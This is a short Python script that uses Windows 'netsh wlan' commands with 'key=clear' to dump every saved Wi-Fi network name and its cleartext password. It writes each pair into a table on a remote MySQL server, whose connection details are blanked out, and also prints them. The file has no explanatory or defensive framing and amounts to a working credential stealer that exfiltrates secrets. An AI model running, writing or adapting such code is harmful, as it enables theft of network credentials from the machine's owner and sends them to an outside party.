import subprocess
#MySQL Library
import mysql.connector


#Database Credential
mydb = mysql.connector.connect(
  host="xxxxxxxx",
  user="xxxxxxx",
  database="xxxxxx",
  password="xxxxxxxx"
)
 
data = (
    subprocess.check_output(["netsh", "wlan", "show", "profiles"])
    .decode("utf-8")
    .split("\n")
)
profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
for i in profiles:
    results = (
        subprocess
        .check_output(["netsh", "wlan", "show", "profile", i, "key=clear"])
        .decode("utf-8")
        .split("\n")
    )
    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
    try:
        mycursor = mydb.cursor()
        sql = "INSERT INTO wifi_password_history (ssid, password) VALUES (%s, %s)"
        val = (i,results[0])
        mycursor.execute(sql, val)
        print("SSID : {:<30}| PASSWORD :  {:<}".format(i, results[0]))
        mydb.commit()
    except IndexError:
        print("SSID : {:<30}| PASSWORD :  {:<}".format(i, "undefined"))